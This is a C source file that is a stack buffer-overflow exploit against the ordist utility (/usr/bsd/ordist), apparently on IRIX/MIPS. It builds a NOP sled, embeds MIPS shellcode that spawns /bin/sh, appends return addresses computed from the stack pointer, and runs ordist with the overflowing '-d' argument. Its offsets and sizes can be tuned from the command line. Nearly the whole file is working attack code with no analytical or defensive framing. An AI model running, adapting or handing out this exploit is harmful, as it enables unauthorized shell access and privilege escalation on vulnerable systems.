#include <stdlib.h>
#include <fcntl.h>

#define BUFSIZE 306
#define OFFS 800
#define ADDRS 2
#define ALIGN 2

void run(unsigned char *buf) {

  execl("/usr/bsd/ordist", "ordist", "-d", buf, "-d", buf, NULL);
  printf("execl failed\n");
}

char asmcode[]="\x3c\x18\x2f\x62\x37\x18\x69\x6e\x3c\x19\x2f\x73\x37\x39\x68\x2e\xaf\xb8\xff\xf8\xaf\xb9\xff\xfc\xa3\xa0\xff\xff\x27\xa4\xff\xf8\x27\xa5\xff\xf0\x01\x60\x30\x24\xaf\xa4\xff\xf0\xaf\xa0\xff\xf4\x24\x02\x04\x23\x02\x04\x8d\x0c";
char nop[]="\x24\x0f\x12\x34";

unsigned long get_sp(void) {
__asm__("or     $2,$sp,$0");
}

/* this align stuff sux - i do know. */
main(int argc, char *argv[]) {
  char *buf, *ptr, addr[8];
  int offs=OFFS, bufsize=BUFSIZE, addrs=ADDRS, align=ALIGN;
  int i, noplen=strlen(nop);

  if (argc >1) bufsize=atoi(argv[1]);
  if (argc >2) offs=atoi(argv[2]);
  if (argc >3) addrs=atoi(argv[3]);
  if (argc >4) align=atoi(argv[4]);

  if (bufsize<strlen(asmcode)) {
    printf("bufsize too small, code is %d bytes long\n", strlen(asmcode));
    exit(1);
  }
  if ((buf=malloc(bufsize+ADDRS<<2+noplen+1))==NULL) {
    printf("Can't malloc\n");
    exit(1);
  }
  *(int *)addr=get_sp()+offs;
  printf("address - %p\n", *(int *)addr);

  strcpy(buf, nop);
  ptr=buf+noplen;
  buf+=noplen-bufsize % noplen;
  bufsize-=bufsize % noplen;

  for (i=0; i<bufsize; i++)
    *ptr++=nop[i % noplen];
  memcpy(ptr-strlen(asmcode), asmcode, strlen(asmcode));
    memcpy(ptr, nop, strlen(nop));
    ptr+=align;
  for (i=0; i<addrs<<2; i++)
    *ptr++=addr[i % sizeof(int)];
  *ptr=0;
  printf("total buf len - %d\n", strlen(buf));

  run(buf);
}
